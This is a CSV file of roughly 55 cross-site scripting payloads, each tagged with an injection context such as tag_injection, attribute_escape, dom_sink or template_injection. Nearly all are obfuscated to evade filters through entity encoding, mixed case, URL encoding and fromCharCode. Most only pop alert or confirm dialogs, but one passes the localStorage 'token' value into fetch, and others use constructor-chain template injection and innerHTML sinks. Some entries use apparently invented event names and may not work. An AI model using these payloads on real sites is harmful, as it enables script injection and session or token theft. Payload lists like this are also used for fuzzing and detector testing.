payload,context
<img x=y onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection
" onfocus=prompt(String.fromCharCode(88,83,83))",event_handler
__proto__[%22onclick%22]=eval(location.hash),dom_sink
<!--><math onpromptaction=prompt(1)>,tag_injection
"Object.assign(window,{""onerror"":eval})",dom_sink
"""%3E%3Cimg src=x onhashchange=confirm(document.domain)%3E",attribute_escape
<ifRamE oNseCurItyPolIcyVioLatIon=coNfiRm('XSS')>,tag_injection
<table src=x onsearch=prompt(1)>,tag_injection
	onWebKitAniMatIonEnd=coNfiRm(DocUmeNt.DomAin),event_handler
"ObjEct.asSigN(wIndOw,{""oNhaShcHanGe"":evAl})",dom_sink
'><img src=x onended=prompt('XSS')>,attribute_escape
<area onload=console.log(document.domain)>,tag_injection
"<script
>\u0061lert(location.hash)</script>",script_injection
' %3E%3Csvg onbeforetoggle=confirm(location.hash)%3E,attribute_escape
	ontr&#97;nsitionst&#97;rt=confirm(loc&#97;tion.h&#97;sh),event_handler
onw&#101;bkittr&#97;nsition&#101;nd=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"EvaL(""FetCh(LocAlSTorAge.geTItEm('toKen'))"")",dom_sink
<!--><s&#101;l&#101;ct on&#97;nim&#97;tionst&#97;rt=prompt('XSS')>,tag_injection
`><img src=x onk&#101;ypr&#101;ss=&#97;l&#101;rt('XSS')>,attribute_escape
\%27 onpromptaction=prompt(1)//,attribute_escape
"document.body.innerHTML=""<img src=x onerror=confirm(document.domain)>""",dom_sink
${confirm(docum&#101;nt.dom&#97;in)|n},template_injection
\%22 onpointerover=console.log(%27XSS%27)//,attribute_escape
&quot; onlo&#97;d=&#97;l&#101;rt(1) x=&quot;,attribute_escape
' onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log('XSS') ',attribute_escape
"""><mt&#101;xt onfocusout=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
<!--><img onkeypress=console.log(1)>,tag_injection
ondragover=prompt&#40;document.domain&#41;,event_handler
' onwebkitfullscreenchange=\u0061lert('XSS') ',attribute_escape
`%3E%3Cimg src=x onfocus=alert(1)%3E,attribute_escape
"JavAscRipT:cOnfIrm/*x*/(StrIng.frOmCHarCodE(88,83,83))",js_uri
'%3E%3Cimg src=x onpointerup=alert(1)%3E,attribute_escape
<xmP/oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)>,tag_injection
%27 ><svg onreset=prompt(location.hash)>,attribute_escape
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""confirm(1)"")",dom_sink
"\"" onpromptaction=console.log('XSS')//",attribute_escape
""" %3E%3Csvg onpointermove=alert(document.domain)%3E",attribute_escape
#set($x='alert(document.domain)')$x,template_injection
' ><svG oNbeForEinPut=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
"""%3E%3Cmarquee onclose=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<m&#97;rqu&#101;&#101;/on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"onpagereveal=javascript:alert(String.fromCharCode(88,83,83))",event_handler
"""><img src=x ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
<audio src=x onmouseover=console.log(%27XSS%27)>,tag_injection
<pl&#97;int&#101;xt onr&#101;p&#101;&#97;t=prompt('XSS')/>,tag_injection
OnpAgeSwaP=jAvaScrIpt:coNsoLe.Log(loCatIon.haSh),event_handler
""" ontouchend=console.log('XSS') """,attribute_escape
{{constructor.constructor(%27alert(%27XSS%27)%27)()}},template_injection
"data:text/html,%3Cscript%3Eprompt(String.fromCharCode(88,83,83))%3C/script%3E",js_uri
%22><svg onbeforecopy=prompt(document.domain)>,tag_injection
""" onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
\' onmouseenter=alert(location.hash)//,attribute_escape
"""><Set onFocUs=ProMpt(doCumEnt.doMaiN)>",tag_injection
&quOt; onBefOrePasTe=AleRt('XSS') x=&quOt;,attribute_escape
"\' onbeforepaste=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"&quot; onbegin=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
